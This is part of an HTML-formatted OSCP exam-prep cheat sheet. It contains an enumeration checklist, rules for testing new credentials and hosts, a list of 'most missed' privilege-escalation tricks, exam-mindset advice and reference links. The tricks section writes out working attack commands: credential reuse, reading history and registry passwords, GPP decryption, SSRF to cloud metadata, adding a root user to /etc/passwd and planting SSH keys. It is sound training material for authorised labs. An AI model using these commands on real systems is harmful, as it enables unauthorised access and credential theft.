+[ ] D-Bus / Polkit / PackageKit
+[ ] snapd / snap-confine
+[ ] AppArmor / SELinux state
+[ ] Docker socket
+[ ] LXC/LXD group membership
+[ ] UNIX sockets
+[ ] Named pipes
+[ ] DPAPI
+[ ] Windows LAPS
+[ ] gMSA
+[ ] Shadow Credentials
+[ ] AD CS ESC1–ESC17
+[ ] RBCD / delegation attributes
+[ ] GPO ACLs
+[ ] Certificate mapping
+[ ] Internal DNS after pivot
+[ ] New routes after pivot
+[ ] Exact Windows build + installed drivers
+[ ] Exact kernel config + package backports
+[ ] CVE prerequisites before PoC
+</code></pre>
+<h3>The "New Credential" Rule</h3>
+<p>Every time you find a credential:</p>
+<pre class="ref-code"><code class="language-text">IDENTIFY TYPE
+   ↓
+IDENTIFY OWNER
+   ↓
+TEST ALL RELEVANT SERVICES
+   ↓
+CHECK GROUPS / ACLs
+   ↓
+CHECK AD RELATIONSHIPS
+   ↓
+CHECK LAPS / gMSA / CERTIFICATE OPTIONS
+</code></pre>
+<h3>The "New Host" Rule</h3>
+<p>Every time a new hostname/IP appears:</p>
+<pre class="ref-code"><code class="language-text">ADD TO HOSTS/DNS NOTES
+   ↓
+PORT SCAN
+   ↓
+SERVICE ENUM
+   ↓
+COMPARE WITH EXISTING CREDENTIALS
+   ↓
+CHECK TRUST / AD RELATIONSHIPS
+</code></pre>
+</details>
+<h2 id="ref-bonus-most-missed-tricks">🔥 MOST MISSED TRICKS</h2>
+<details id="ref-tricks-most-people-forget">
+<summary>💎 Tricks Most People Forget</summary>
+<pre class="ref-code"><code class="language-bash"># ── ALWAYS CHECK THESE (commonly missed) ─────────────────────
+
+# 1. Credential reuse — ONE justified host/service first
+# Record provenance and check lockout policy first. Authentication != authorization.
+nxc smb   $IP -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
+nxc winrm $IP -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"
+# Expand only after reachability/service evidence or Credential Debt says it is worth testing.
+# Local account only: omit -d and add --local-auth.
+
+# 2. /etc/crontab AND /var/spool/cron/crontabs — different locations!
+cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2&gt;/dev/null | grep -v "^#"
+
+# 3. Internal web apps (common in OSCP):
+ss -tulnp | grep ":8"   # Any 8xxx port?
+curl http://127.0.0.1:8080  # Try it directly
+ssh -L 8080:127.0.0.1:8080 user@$IP  # Forward to see it from Kali
+
+# 4. .bash_history is GOLD — always read it:
+cat ~/.bash_history 2&gt;/dev/null
+cat /home/*/.bash_history 2&gt;/dev/null | sort -u
+
+# 5. Check /var/backups/ and /opt/:
+ls -laR /var/backups/ 2&gt;/dev/null
+ls -laR /opt/ 2&gt;/dev/null
+
+# 6. Config files usually have DB creds — check web root:
+find /var/www -name "*.php" -exec grep -l "password\|DB_PASS\|db_pass" {} \;
+
+# 7. SUID find exploit (super common, always missed):
+find / -perm -4000 -type f 2&gt;/dev/null | while read -r f; do
+  echo "=== $f ===" &amp;&amp; strings $f | grep -v "/" | head -5
+done
+
+# 8. NFS no_root_squash (check EVERY time NFS is open):
+showmount -e $IP
+cat /etc/exports 2&gt;/dev/null | grep -i "no_root_squash"
+
+# 9. Writable cron scripts (use pspy to watch, then check permissions):
+./pspy64 -pf -i 1000 | tee /tmp/pspy.log &amp;
+sleep 60
+grep -E 'root|UID=0' /tmp/pspy.log | grep -v pspy
+
+# 10. MySQL file write requires:
+# - FILE privilege (check: SHOW GRANTS)
+# - secure_file_priv = '' (check: SHOW variables LIKE 'secure_file_priv')
+# - Write access to target path
+mysql -u root -p -e "SHOW variables LIKE 'secure_file_priv';"
+
+# 11. GPP passwords in SYSVOL (if you have any domain user creds):
+nxc smb $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -M gpp_password
+nxc smb $DC -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -M gpp_autologin
+# Manual:
+smbclient "//$DC/SYSVOL" -U "$DOMAIN/$AUTH_USER"   # password prompt
+# find Groups.xml and decrypt with: gpp-decrypt "HASH"
+
+# 12. Unattended install files (Windows — forgotten by admins):
+dir /s /b C:\Windows\Panther\Unattend*.xml 2&gt;nul
+dir /s /b C:\Windows\system32\sysprep\sysprep*.xml 2&gt;nul
+
+# 13. AutoLogon credentials in registry (jackpot when it exists):
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+# 14. SSRF to read cloud metadata (check in web apps):
+curl -s "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl -s "http://TARGET/fetch?url=file:///etc/passwd"
+
+# 15. /etc/passwd writable — snapshot and plan rollback before changing it:
+ls -la /etc/passwd
+stat /etc/passwd
+# If world-writable and this is the selected proven path:
+cp -- /etc/passwd /tmp/passwd.oscp.bak
+stat -c 'owner=%u group=%g mode=%a' /etc/passwd | tee /tmp/passwd.oscp.meta
+PASSWD_HASH=$(openssl passwd -6 'TEMP_STRONG_VALUE')
+printf 'examops:%s:0:0:root:/root:/bin/bash\n' "$PASSWD_HASH" &gt;&gt; /etc/passwd
+su examops
+# Exact rollback from the root shell:
+. /tmp/passwd.oscp.meta
+cp -- /tmp/passwd.oscp.bak /etc/passwd
+chown "$owner:$group" /etc/passwd
+chmod "$mode" /etc/passwd
+
+# 16. SSH authorized_keys — preserve the exact original first:
+ssh-keygen -f /tmp/key -N ""
+cp -a /home/user/.ssh/authorized_keys /tmp/authorized_keys.oscp.bak
+cat /tmp/key.pub &gt;&gt; /home/user/.ssh/authorized_keys
+ssh -i /tmp/key user@$IP
+# Exact rollback from the privileged shell:
+cp -a /tmp/authorized_keys.oscp.bak /home/user/.ssh/authorized_keys
+
+# 17. LinPEAS colors are triage hints, not proof of exploitability.
+# Rank findings by privileged actor + controllable input + trigger + exact prerequisites.
+# Validate one primitive manually before changing the target.
+
+# 18. MySQL UDF privesc (if MySQL running as root + have FILE priv):
+searchsploit mysql udf
+# Download raptor_udf2.c, compile, upload, create function → OS command exec
+
+# 19. PHP disable_functions bypass (if you get a PHP shell but can't exec):
+# Try: system, exec, passthru, shell_exec, popen, proc_open
+# If all disabled → try: mail(), dl(), pcntl_exec()
+# Or use Chankro bypass
+
+# 20. If stuck on Windows privesc — check scheduled tasks binary paths:
+schtasks /query /fo LIST /v | findstr /i "task to run\|run as"
+# Then check if that binary is writable
+icacls "C:\path\to\task_binary.exe"
+
+# 21. Firewall bypass : 
+X-Originating-IP: 127.0.0.1 or 127.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+</code></pre>
+</details>
+<details id="ref-final-oscp-wisdom">
+<summary>🎓 Final OSCP Wisdom</summary>
+<pre class="ref-code"><code>MINDSET SHIFTS THAT MAKE PEOPLE PASS:
+
+1. ENUMERATION IS THE EXPLOIT
+   "The finding is in the nmap output — I just haven't read it carefully enough"
+   Go back to basics when stuck. Re-read everything.
+
+2. EVERY CREDENTIAL CHANGES THE ATTACK SURFACE
+   Record provenance and test appropriate exposed in-scope services with lockout awareness
+   Separate successful authentication from authorization and remote-admin access
+
+3. DEFAULT CREDENTIALS ARE A CONTROLLED TEST
+   Try one evidence-based vendor/application default only where scope and lockout risk permit
+   Do not blindly spray guesses across every service
+
+4. THE EVIDENCE GATE
+   After 20–30 minutes or two failed decisive tests with no new evidence:
+   Park the hypothesis, record its return condition, and rotate
+
+5. FUNDAMENTALS BEAT NOVELTY
+   Prefer confirmed services, credentials, source/configuration and writable privileged paths
+   An exact prerequisite match is stronger than a new or exotic CVE
+
+6. DOCUMENTATION WINS OR LOSES POINTS
+   A well-documented partial compromise can score points.
+   An undocumented full compromise might not.
+   Screenshot. Notes. Commands. Constantly.
+
+7. RESET WITH EVIDENCE
+   When stuck, re-read output, state the hypothesis and run one decisive validation
+   Do not substitute random activity for enumeration or proof
+
+8. PHYSICAL CONDITION MATTERS
+   Sleep. Water. Movement. Breaks.
+   Your brain on hour 16 is significantly worse than hour 4.
+   Build breaks into your plan before you need them.
+
+GOOD LUCK. YOU'VE GOT THIS.
+</code></pre>
+</details>
+<hr/>
+<h2 id="ref-2026-maintenance-primary-references">📚 2026 MAINTENANCE &amp; PRIMARY REFERENCES</h2>
+<h3 id="ref-current-oscp-exam-rules">Current OSCP+ Exam Rules</h3>
+<ul>
+<li>OSCP+ Exam Guide (page updated 20 Apr 2026): https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide</li>
+<li>OSCP+ Exam FAQ (page updated 31 Jul 2026): https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ</li>
+<li>AI Usage Policy (page updated 01 Jul 2026): https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams</li>
+<li>OSCP Candidate Handbook (page updated 31 Jul 2026): https://help.offsec.com/hc/en-us/articles/40393367449108-OSCP-Candidate-Handbook</li>
+<li>OSCP Reporting Requirements (page updated 06 Aug 2026): https://help.offsec.com/hc/en-us/articles/360046787731-OSCP-Reporting-Requirements</li>
+</ul>
+<p><strong>Rule snapshot verified 24 Sep 2026.</strong> Re-check the official guide, FAQ and AI policy immediately before your exam. If these notes conflict with OffSec's current pages or your control-panel instructions, those current sources win.</p>
+<h3 id="ref-vulnerability-intelligence">Vulnerability Intelligence</h3>
+<ul>
+<li>NVD: https://nvd.nist.gov/</li>
+<li>Microsoft Security Response Center: https://msrc.microsoft.com/</li>
+<li>Ubuntu Security Notices: https://ubuntu.com/security/notices</li>
+<li>Debian Security Tracker: https://security-tracker.debian.org/</li>
+<li>Exploit-DB: https://www.exploit-db.com/</li>
+</ul>
+<h3 id="ref-privesc-references">PrivEsc References</h3>
+<ul>
+<li>GTFOBins: https://gtfobins.github.io/</li>
+<li>LOLBAS: https://lolbas-project.github.io/</li>
+<li>HackTricks: https://book.hacktricks.wiki/</li>
+</ul>
+<h3 id="ref-ad-modern-tooling">AD / Modern Tooling</h3>
+<ul>
+<li>NetExec 1.5.1 release/security fix: https://github.com/Pennyw0rth/NetExec/releases/tag/v1.5.1</li>
+<li>NetExec credential/result semantics ([+] and protocol-specific Pwn3d!): https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/getting-started/using-credentials.md</li>
+<li>NetExec local auth: https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/smb-protocol/authentication/checking-credentials-local.md</li>
+<li>NetExec Kerberos cache: https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/getting-started/using-kerberos.md</li>
+<li>NetExec certificate auth: https://github.com/Pennyw0rth/NetExec-Wiki/blob/main/getting-started/using-certificates.md</li>
+<li>Microsoft PowerShell remoting security (authentication and authorization context): https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/winrm-security?view=powershell-7.6</li>
+<li>Certipy releases (5.1.0 stable snapshot): https://github.com/ly4k/Certipy/releases</li>
+<li>BloodHound/Kali package state (checked 24 Sep 2026): https://pkg.kali.org/pkg/bloodhound/news/</li>
+<li>Impacket 0.13.1 release/changelog: https://github.com/fortra/impacket/releases/tag/impacket_0_13_1</li>
+<li>PayloadsAllTheThings:
+https://github.com/swisskyrepo/PayloadsAllTheThings</li>
+</ul>
+<h3 id="ref-cve-entry-standard">CVE Entry Standard</h3>
+<p>When adding a future CVE, record:</p>
+<pre class="ref-code"><code class="language-text">CVE
+Component
+Affected versions/builds
+Local/remote
+Required privileges
+Required configuration
+Exploit prerequisites
+Public PoC
+Reliability
+Detection method
+Primary reference
+</code></pre>
+<blockquote>
+<p><strong>Maintenance principle:</strong> new does not automatically mean useful. Add
+CVEs that improve target identification, validation, or a realistic
+OSCP attack path.</p>
+</blockquote>
